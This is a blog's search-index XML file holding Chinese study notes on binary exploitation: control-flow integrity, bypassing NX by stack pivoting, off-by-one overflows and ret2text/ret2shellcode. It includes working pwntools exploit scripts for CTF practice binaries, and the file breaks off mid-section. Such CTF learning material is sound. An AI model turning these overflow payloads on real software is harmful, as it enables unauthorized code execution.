<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>blind-rop</title>
      <link href="/2023/05/12/blind-rop/"/>
      <url>/2023/05/12/blind-rop/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HEAP-EXP-heap_management</title>
      <link href="/2023/05/12/heap-exp-heap-management/"/>
      <url>/2023/05/12/heap-exp-heap-management/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass-aslr</title>
      <link href="/2023/05/05/bypass-aslr/"/>
      <url>/2023/05/05/bypass-aslr/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CFI-Sec</title>
      <link href="/2023/05/02/cfi-sec/"/>
      <url>/2023/05/02/cfi-sec/</url>
      
        <content type="html"><![CDATA[<h2 id="Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms"><a href="#Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms" class="headerlink" title="Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms"></a>Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms</h2><hr><p><img src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048279.png" alt="image-20230502185448539"></p><p>​最早的CFI机制在2005年被提出，后续又出现了各种各样的CFI，但是有一点就是这些机制都不能给予程序绝对的控制流安全性。通常的做法是给ICT（indirect control transfer）指令施加监视器，一个ICT可能存在多个合法的跳转目标，但是在每次执行的时候只能跳转到一个确定的位置。（因此最理想的情况就是每条跳转指令只能有一个确定的跳转位置）</p><p>​当前的任何CFI控制流安全策略都需要解决以下几个问题：</p><ul><li>如何让claimed boundary和real boundary match？</li><li>有些可行的目标组合依然会导致漏洞利用（这不就是DOP么？）</li></ul><p>然后这个文章后面讲了评估CFI方案好坏的方法，等用到的时候再看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass-NX</title>
      <link href="/2023/05/02/bypass-nx/"/>
      <url>/2023/05/02/bypass-nx/</url>
      
        <content type="html"><![CDATA[<h2 id="Bypass-NX（DEP）"><a href="#Bypass-NX（DEP）" class="headerlink" title="Bypass NX（DEP）"></a>Bypass NX（DEP）</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>​既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p><p><strong>least privilege &amp; seteuid(getuid())</strong></p><p>​在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token function">system</span><span class="token punctuation">(</span>“sh”<span class="token punctuation">)</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是存在问题，setuid的参数是\x00，但是strcpy在遇到\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p><ul><li>ESP lifting (ESP抬升)</li><li>Frame Faking(栈帧伪造)</li><li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></li></ul><p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leave:        move esp,ebp ; 恢复栈顶指针        pop ebp ;(esp=esp+4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp,ebp --&gt; old_ebp        --&gt; ret_addr        --&gt; arg1 :此处是指向system字符串参数的指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="例题-ciscn-2019-s-4"><a href="#例题-ciscn-2019-s-4" class="headerlink" title="例题 ciscn_2019_s_4"></a>例题 ciscn_2019_s_4</h3><p><img src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png" alt="image-20230504193243253"></p><p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p><p><img src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png" alt="image-20230504193612815"></p><p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置...ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此   [ret_add] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: mov esp,ebp----------------------------------------------ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此   [new_ret_addr] ; 记录当前的返回地址----------------------------------------------inst: pop ebp----------------------------------------------ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论esp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">inst: mov esp,ebp----------------------------------------------ebp,esp = buff_ ; 执行结束后完成将esp的抬升----------------------------------------------inst: pop ebp----------------------------------------------esp = buff_ ;  ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''静态查找leave ret指令地址'''</span>system_addr <span class="token operator">=</span> <span class="token number">0x8048400</span>leave_ret_addr<span class="token operator">=</span><span class="token number">0x080484B8</span>ret_addr <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''第一次直接构造和buff长度相同的输入，printf时会输出后续内容'''</span>payload <span class="token operator">=</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?\n'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''接收泄露的ebp输出'''</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">)</span>ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38'''</span>fake_ebp <span class="token operator">=</span> ebp <span class="token operator">-</span><span class="token number">0x38</span><span class="token triple-quoted-string string">'''构造第二次输入的payload'''</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment"># ret addr</span>payload<span class="token operator">+=</span><span class="token string">b'aaaa'</span> <span class="token comment"># junk ret addr 用于模拟call system时的压入返回值操作</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>payload<span class="token operator">+=</span><span class="token string">b'/bin/sh\x00'</span> <span class="token comment"># payload</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token comment"># 这里对当前的栈进行补齐操作</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>fake_ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span>leave_ret_addr<span class="token punctuation">)</span> <span class="token comment"># 填入leave ret返回值</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意两个关键位置：</p><p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p><p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/sea_time/article/details/106142971">https://blog.csdn.net/sea_time/article/details/106142971</a></p><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>personal_plan</title>
      <link href="/2023/05/02/personal-plan/"/>
      <url>/2023/05/02/personal-plan/</url>
      
        <content type="html"><![CDATA[<h1 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h1><p>​本文用于对当前的栈中的内容和未学习内容进行索引。<a href="https://github.com/CHYbeta/Software-Security-Learning">https://github.com/CHYbeta/Software-Security-Learning</a></p><h2 id="二进制安全"><a href="#二进制安全" class="headerlink" title="二进制安全"></a>二进制安全</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><strong>SEH机制</strong></li><li></li></ul><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul><li>One byte overflow</li></ul><h2 id="安卓安全"><a href="#安卓安全" class="headerlink" title="安卓安全"></a>安卓安全</h2><h2 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h2><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><ul><li></li></ul><h2 id="CTF-WP"><a href="#CTF-WP" class="headerlink" title="CTF WP"></a>CTF WP</h2>]]></content>
      
      
      
        <tags>
            
            <tag> personal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_byte_overflow</title>
      <link href="/2023/04/27/one-byte-overflow/"/>
      <url>/2023/04/27/one-byte-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="off-By-One-缓冲区溢出"><a href="#off-By-One-缓冲区溢出" class="headerlink" title="off-By-One 缓冲区溢出"></a>off-By-One 缓冲区溢出</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​本文用于填补先前对于二进制漏洞一些理解上的不足，学习off-by-one的漏洞利用方式。<strong>缓冲区溢出的终极目的在于获取目标机器的权限，但是获取权限未必只要一种方式，你可以添加用户，反弹shell、开启一个新的网络链接等</strong>。主要参考：<a href="https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</a></p><h3 id="单字节溢出案例"><a href="#单字节溢出案例" class="headerlink" title="单字节溢出案例"></a>单字节溢出案例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">bar</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [1] */</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [2] */</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* [3] */</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Attempted Buffer Overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">foo</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [4] */</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​<strong>当目标缓冲区大小与写入长度相一致时，会出现单字节溢出</strong>，因为在strcpy的处理过程中，将传入的参数都视为视为是字符串，默认会在复制过后在末尾添加一个字节的0x00，因此会向buffer的第256个位置处写0x00。</p><p>​该操作会向下一个位置中写入0x00，下一个位置有可能就是ebp的存储位置，其实也就是栈区基地址。但是只能更改一个字节，其实也就是ebp指针的最低字节，当前过程在退出的过程中，执行leave指令，会将被修改后的ebp写入到寄存器中。</p><p>​<strong>栈基址</strong>的高位迁移。由于只能向ebp的低字节中写入一个0，也就是稳定会将ebp抬高，从而更改栈的位置。当前ebp的较高位置其实就是用于存放当前函数临时变量的位置，其实也就控制了栈。在上述例子中，在foo函数中完成了栈的抬升，将栈设置到可控区域中。在main函数退出时就会取出错误的返回地址return，进行间接的控制流劫持操作。</p><h3 id="栈迁移不可用的情况"><a href="#栈迁移不可用的情况" class="headerlink" title="栈迁移不可用的情况"></a>栈迁移不可用的情况</h3><ul><li><p><strong>单字节溢出无法影响ebp</strong>：如果本身当前的缓冲区在ebp之上，但是并不能</p></li><li><p><strong>栈基地址的低位本身就是0x00</strong>：</p></li><li><p><strong>程序本身存在16字节对齐的情况</strong>：其实默认情况下gcc编译器都会对程序进行16字节的对齐，因此在创建堆栈空间之前会将esp的最后四个位进行清零操作。（因为最后四位正好是表示16个字节</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x08048497 &lt;+0&gt;: push %ebp0x08048498 &lt;+1&gt;: mov %esp,%ebp0x0804849a &lt;+3&gt;: push %edi0x0804849b &lt;+4&gt;: and $0xfffffff0,%esp               //Stack space aligned to 16 byte boundary0x0804849e &lt;+7&gt;: sub $0x20,%esp   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>关于栈迁移请参考该位置<a href="https://alazymechnaic.github.io/2023/05/02/bypass-nx/">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> binary security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack_based_overflow</title>
      <link href="/2023/04/26/stack-based-overflow/"/>
      <url>/2023/04/26/stack-based-overflow/</url>
      
        <content type="html"><![CDATA[<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="ret2text¶"><a href="#ret2text¶" class="headerlink" title="ret2text¶"></a>ret2text<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">¶</a></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_1">¶</a></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_2">¶</a></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>首先，查看一下程序的保护机制</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2text checksec ret2text    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts("There is something amazing here, do you know anything?");  gets((char *)&amp;v4);  printf("Maybe I will tell you next time !");  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:080485FD secure          proc near.text:080485FD.text:080485FD input           = dword ptr -10h.text:080485FD secretcode      = dword ptr -0Ch.text:080485FD.text:080485FD                 push    ebp.text:080485FE                 mov     ebp, esp.text:08048600                 sub     esp, 28h.text:08048603                 mov     dword ptr [esp], 0 ; timer.text:0804860A                 call    _time.text:0804860F                 mov     [esp], eax      ; seed.text:08048612                 call    _srand.text:08048617                 call    _rand.text:0804861C                 mov     [ebp+secretcode], eax.text:0804861F                 lea     eax, [ebp+input].text:08048622                 mov     [esp+4], eax.text:08048626                 mov     dword ptr [esp], offset unk_8048760.text:0804862D                 call    ___isoc99_scanf.text:08048632                 mov     eax, [ebp+input].text:08048635                 cmp     eax, [ebp+secretcode].text:08048638                 jnz     short locret_8048646.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh".text:08048641                 call    _system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:080486A7                 lea     eax, [esp+1Ch].text:080486AB                 mov     [esp], eax      ; s.text:080486AE                 call    _gets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p><pre class="line-numbers language-none"><code class="language-none">gef➤  b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤  rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424      gets(buf);───────────────────────────────────────────────────────────────────────[ registers ]────$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"$ebx   : 0x00000000$ecx   : 0xffffffff$edx   : 0xf7faf870  →  0x00000000$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"$ebp   : 0xffffcdc8  →  0x00000000$esi   : 0xf7fae000  →  0x001b1db0$edi   : 0xf7fae000  →  0x001b1db0$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p><ul><li>s 的地址为 0xffffcd5c</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>最后的 payload 如下：</p><pre class="line-numbers language-none"><code class="language-none">##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c+4) + p32(target))sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ret2shellcode¶"><a href="#ret2shellcode¶" class="headerlink" title="ret2shellcode¶"></a>ret2shellcode<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">¶</a></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3">¶</a></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_4">¶</a></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>首先检测程序开启的保护</p><pre class="line-numbers language-none"><code class="language-none">➜  ret2shellcode checksec ret2shellcode    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts("No system for you this time !!!");  gets((char *)&amp;v4);  strncpy(buf2, (const char *)&amp;v4, 0x64u);  printf("bye bye ~");  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><pre class="line-numbers language-none"><code class="language-none">.bss:0804A080                 public buf2.bss:0804A080 ; char buf2[100]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><pre class="line-numbers language-none"><code 